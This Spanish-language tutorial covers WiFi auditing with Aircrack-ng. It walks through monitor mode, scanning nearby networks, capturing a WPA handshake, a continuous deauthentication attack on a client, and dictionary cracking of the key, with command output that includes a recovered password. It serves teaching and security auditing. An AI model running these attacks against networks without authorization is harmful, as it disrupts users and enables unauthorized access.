# Explotación de vulnerabilidades en redes Wifi

Como se ha detallado en el apartado anterior encontramos diferentes aspectos dentro de una red wifi que deben de ser analizados. Para realizar análisis de redes wifi disponemos de la suite [**Aircrack-ng**](https://www.aircrack-ng.org/), la cual nos brinda numerosas herramientas para poder realizar dicho análisis.

## ¿Qué es el modo monitor?

Antes de entrar en materia, es necesario introducir un concepto nuevo en el ámbito de las redes wifi: _monitor mode_. Haciendo una simple búsqueda en Wikipedia encontramos:

```Monitor mode, or RFMON (Radio Frequency MONitor) mode, allows a computer with a wireless network interface controller (WNIC) to monitor all traffic received on a wireless channel. Unlike promiscuous mode, which is also used for packet sniffing, monitor mode allows packets to be captured without having to associate with an access point or ad hoc network first```

Traduciendo al español (la parte que nos interesa) concluimos que el modo monitor nos permite capturar paquetes sin necesidad de estar asociado a un punto de acceso. Esta funcionalidad que nos permiten determinadas chips de tarjetas wifi será esencial para analizar las diferentes redes de nuestro entorno.

### ¿Cómo comprobar si la tarjeta es compatible?

Una vez que ha quedado claro que es el modo monitor y para que sirve, se recomienda __utilizar tarjetas externas__ por dos razones principales:

*   El chipset de las tarjetas externas brindan mejor soporte para modo monitor.
*   La tarjeta wifi interna puede ser dañada debido al procesamiento de paquetes.

Dicho esto, lo primero que tenemos que realizar sería comprobar que tenemos una tarjeta que soporte el modo monitor, para ello utilizaremos el siguiente comando:

        $ iw list 
    
Dentro de la salida extensa de este comando tenemos la categoria _Supported interface modes_ donde podemos comprobar si se incluye el modo monitor.

### Activando el modo monitor: airmon-ng

Una vez comprobado si la tarjeta es compatible, pasaremos a ponerla el modo monitor. 

```Aircrack-ng requiere ser ejecutado como root```
```  Para los ejemplos de comandos se utilizará la interfaz wlan1, esto debe de ser cambiado según la interfaz```


    $ root@HowIsCoding:~$  airmon-ng check wlan1

    Found 5 processes that could cause trouble.
    Kill them using 'airmon-ng check kill' before putting
    the card in monitor mode, they will interfere by changing channels
    and sometimes putting the interface back in managed mode

    PID Name
    5771 dhclient
    7888 wpa_supplicant
    8878 NetworkManager
    9214 avahi-daemon
    9225 avahi-daemon

Antes de poner la interfaz en modo monitor debemos de realizar una comprobación en busca de procesos (como el network Manager) que esten utilizando la interfaz, de forma que tendremos que matarlos. Si dejamos estos procesos corriendo pueden realizar acciones como cambiar la antena de canal o impedirla trabajar el modo monitor. 

Para matar estos procesos simplemente usamos la herramienta airmon-ng para matarlos:

    $ airmon-ng check kill

!!! info
	Posteriormente tendremos que habilitar el proceso _network-manager_ para conectarnos a la red wifi. También será necesario desactivar la interfaz de modo monitor.

Cuando tenemos los procesos que entraban en conflicto matados podemos pasar a poner la interfaz en modo monitor, para ello usaremos la misma herramienta:

    $ airmon-ng start wlan1

    PHY	Interface	Driver		Chipset

    phy0	wlan1		ath9k_htc	Atheros Communications, Inc. AR9271 802.11n

		(mac80211 monitor mode vif enabled for [phy0]wlan1 on [phy0]wlan1mon)
		(mac80211 station mode vif disabled for [phy0]wlan1)

Como podemos ver en la salida del comando airmon-ng se ha habilitado el modo monitor de nuestra tarjeta. Para operar con el modo monitor se habilita la interfaz wlan1mon.

Podemos comprobar los canales Wifi en los que esta escuchando nuestra tarjeta en modo monitor, para ello podemos usar el comando:
    
    $ iwlist wlan1mon channel

Cuando hemos encontrado la red que queremos auditar (como se explicará en el siguiente apartado), podemos suministrar el canal como argumento opcional a airmon-ng, de la siguiente forma:

    $ airmon-ng start wlan1 3



Al igual que podemos poner la tarjeta en modo monitor, cuando terminemos de trabajar con ella debemos desactivarla, para ello airmon-ng nos permite desactivarlo haciendo uso del comando:
    
    $ airmon-ng stop wlan1


## Escaneando redes wifi: airodump-ng

Una vez con nuestra interfaz en modo monitor pasaremos a realizar un escaneo de todas las redes wifi que estan en nuestro entorno, para ello utilizaremos la herramienta _airodump-ng_

    $ airodump-ng wlan1mon

	CH 12 ][ Elapsed: 12 s ][ 2019-01-13 13:34                                         
                                                                                             
	 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                             
	 AA:5D:17:03:35:FC  -41       33        0    0   7  54   WPA2 CCMP   PSK  RaspberryPI        
	 7C:8B:CA:6C:85:80  -42       21      100   40   4   54  WPA2 CCMP   PSK  TP-Link_8580       
	 A4:08:F5:E6:23:06  -57       13        0    0  11   54  WPA2 CCMP   PSK  vodafone2300       
	 94:6A:B0:CB:6F:EA  -62       19       80    0   4   54  WPA2 CCMP   PSK  MiFibra-6FE8       
	 F8:FB:56:28:37:01  -69        1        3    0   7   54  WPA2 CCMP   PSK  micasa             
	 44:48:C1:0F:0B:01  -72        5        0    0  11   54  WPA2 CCMP   MGT  VECTORITC-CORPORATI
	 78:29:ED:83:11:BF  -73        8        0    0  11   54  WPA2 CCMP   PSK  MOVISTAR_11BE      
	 44:48:C1:0F:0B:00  -73        7        0    0  11   54  WPA2 CCMP   MGT  VECTORITC-COLABORAD
	 44:48:C1:0F:0B:02  -73        7        0    0  11   54  OPN              VECTORITC-INVITADOS
	 B0:4E:26:1D:93:57  -74        2        0    0   6   54  WPA2 CCMP   PSK  TP-Link_9358        
	 EC:08:6B:AB:77:F0  -75        4        0    0   3   54  WPA2 CCMP   PSK  TP-LINK_77F0       
	 F4:F2:6D:2C:58:99  -83        1        2    0   9   54  WPA2 CCMP   PSK  Ororo _EXT          
	 F4:F2:6D:EC:C4:71  -83        0       22    0  10  -1   WPA              <length:  0>        
	00:16:0A:13:DB:42  -85        5        0    0  11  54 . WPA2 CCMP   PSK  RAFAELA             
                                                                                              
	BSSID              STATION            PWR   Rate    Lost    Frames  Probe                    
                                                                                              
	7C:8B:CA:6C:85:80  10:02:B5:8A:95:26   -1    0e- 0      0      100                           
	94:6A:B0:CB:6F:EA  7C:8B:CA:6C:85:81  -29    5e- 0e     0       76                           
	F8:FB:56:28:37:01  E4:0E:EE:44:DF:24  -72    1e- 1      0        4                           
	EC:08:6B:AB:77:F0  4C:74:03:70:7C:3A  -85    0 - 6      0        1                  

``` La terminología usada en el resultado de este comando esta explicada en el apartado anterior```

!!! warning
	 Detectamos en el escaneo una red OPN, esto quiere decir que no posee cifrado. Dejar una red sin cifrado (aunque sea una pública) puede desembocar y graves problemas de seguridad. Siempre es recomendado tener habilitado el protocolo WPA2 CCMP  o WPA3 al ser el protocolo más robusto.


Airodump-ng realizará un escaneo por todos los canales de radio referentes a las redes wifi e irá buscando las diferentes señales y los clientes conectados a la mismas.

Este resultado nos será útil para identificar todas las señales wifi de nuestro entorno, así como los clientes conectados a estas. Tenemos que tener en cuenta que si un punto de acceso tiene clientes conectados, el proceso de obtención de la contraseña será más fácil de realizar.


### Limitando el rango de búsqueda

En el anterior ejemplo estabamos haciendo una captura de todos los canales wifi, de forma que nuestra interfaz (en modo monitor) iba cambiando constantemente de canal para encontrar los clientes y puntos de acceso de cada canal.

Sin embargo, cuando estamos trabando con un objetivo en concreto tenemos que  capturar información  exclusivamente de dicho AP para ello tenemos que  especificar su dirección MAC(bssid) y Canal en el que emite podemos obtener mayor información de esta red, indicaremos también un fichero donde almacenar la información que capturemos, de forma que el handshake quede almacenado para posterior tratamiento.

	$ airodump-ng --bssid 7C:8B:CA:6C:85:80 -c 4 -w capture wlan1mon

Este comando nos dará como resultado un paquete _cap_(capture.cap) para analizar posteriormente.

Tenemos que esperar hasta que capturemos el handsake, es decir, tenemos que esperar hasta que un cliente se conecte al punto de acceso y por ende comience el proceso de autenticación descrito anteriormente.
	
	$ CH  4 ][ Elapsed: 30 s ][ 2019-01-13 13:46 ][ WPA handshake: 7C:8B:CA:6C:85:80              
                                                                                             
	 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                             
	 7C:8B:CA:6C:85:80  -34  57      303    12529  816   4   54  WPA2 CCMP   PSK  TP-Link_8580   
                                                                                             
	 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                   
                                                                                             
	 7C:8B:CA:6C:85:80  CC:9F:7A:1D:02:27  -35    0e- 0e   108      317  TP-Link_8580             
	 7C:8B:CA:6C:85:80  10:02:B5:8A:95:26  -42    0e- 6e     0    12360                           

En este momento hemos obtenido el handsake referente al AP, de forma que podemos detener la captura de paquetes.

## Generando tráfico Wifi: aireplay-ng

aireplay-ng es una herramienta dentro de la suite que nos permite generar tráfico para posteiormente utilizarlo en el proceso de craking de contraseñas WEP o WPA PSK. 

En nuestro caso, estamos trabajando en una red WPA PSK. Cuando encontramos un cliente conectado a esta red, el proceso de captura de handsake parece imposible (puesto que el handsake se obtiene durante el proceso de autenticación), por lo cual, tendríamos que esperar a que el cliente u otro nuevo se conecte, en este punto es donde entra en juego aireplay.

Podemos enviar paquetes que permite desautenticar a los clientes de una red, dichos clientes, posteriormente se verán obligados a conectarse y nosotros capturaremos el handsake.

Con aireplay-ng podemos enviar diferente tipo de tráfico, sin embargo, como hemos mencionado en nuestro caso nos interesa desauntenticar al usuario, para ello usaremos:
	
	$ root@kali:~# aireplay-ng -0 0 -a 7C:8B:CA:6C:85:80 -c CC:9F:7A:1D:02:27 wlan1mon             
	14:05:50  Waiting for beacon frame (BSSID: 7C:8B:CA:6C:85:80) on channel 4                   
	14:05:51  Sending 64 directed DeAuth (code 7). STMAC: [CC:9F:7A:1D:02:27] [19|65 ACKs]       
	14:05:51  Sending 64 directed DeAuth (code 7). STMAC: [CC:9F:7A:1D:02:27] [ 0|58 ACKs]       
	14:05:52  Sending 64 directed DeAuth (code 7). STMAC: [CC:9F:7A:1D:02:27] [ 0|61 ACKs]       
	14:05:53  Sending 64 directed DeAuth (code 7). STMAC: [CC:9F:7A:1D:02:27] [ 0|66 ACKs]       

En este comando, estamos especificando los siguientes parámetros:

* -0 0 --> Indicamos que es un ataque de desautenticación. Con 0 indicamos el intervalo de envío, en este caso continuamente

* -a --> Indicamos la dirección MAC del punto de acceso

* -c --> Indicamos la dirección MAC del cliente para desautenticar

Pasando un tiempo, el cliente será desautenticado y automaticamente intentará volver a conectarse (de forma manual o automática), será en ese momento donde podamos capturar el handsake.

## Obteniendo la contraseña: aircrack-ng

aircrack-ng es la herramienta que nos permite crackear la contraseña, podemos utilizar diferentes métodos, en este caso vamos a realizar un ataque por diccionario. Podemos utilizar otros métodos como cracking mediante gpu haciendo uso de herramientas como [_pyrit_](https://github.com/JPaulMora/Pyrit).

	$ aircrack-ng -w passwordList capture-01.cap

	                       Aircrack-ng 1.5.2 

      [00:00:00] 2/1 keys tested (25.73 k/s) 

      Time left: 0 seconds                                     200.00%

                           KEY FOUND! [ $Afmin123 ]


      Master Key     : E3 77 86 87 FB A3 E9 54 77 EC 16 11 56 50 F8 C0 
                       D5 8B 37 2F 0E 16 A7 F1 38 A3 C9 E5 75 AB EE B7 

      Transient Key  : 8D 67 66 D7 74 3D AD A5 76 08 83 91 3C 10 56 49 
                       81 14 B7 68 95 51 3B 2D 2D 25 70 1D D9 31 73 D2 
                       44 DE 8A 54 25 CA F9 AB B6 99 1A 9A 7E D3 D4 25 
                       EC E3 C5 E3 BF 4B 9A 1E 52 48 37 68 DA 8F 32 30 

      EAPOL HMAC     : 79 F3 A9 F9 FA CA 60 C6 4E 45 8C 3D B6 77 0C D2 

Tras realizar el ataque, si este ha concluido satisfactoriamente, encontraremos la contraseña, así como las diferentes claves utilizadas durante el proceso.

!!! warning

	El cracking de la contraseña se ha realizado tan rápido a causa de que la contraseña esta dentro de un diccionario. Las contraseñas por defecto suelen estar en los diferentes diccionarios disponibles por internet.

	A pesar de que la contraseña no este dentro de un diccionario podemos realizar un ataque usando procesamiento por GPU, de forma que si es simple la contraseña conllevará muy poco tiempo obtenerla.
 
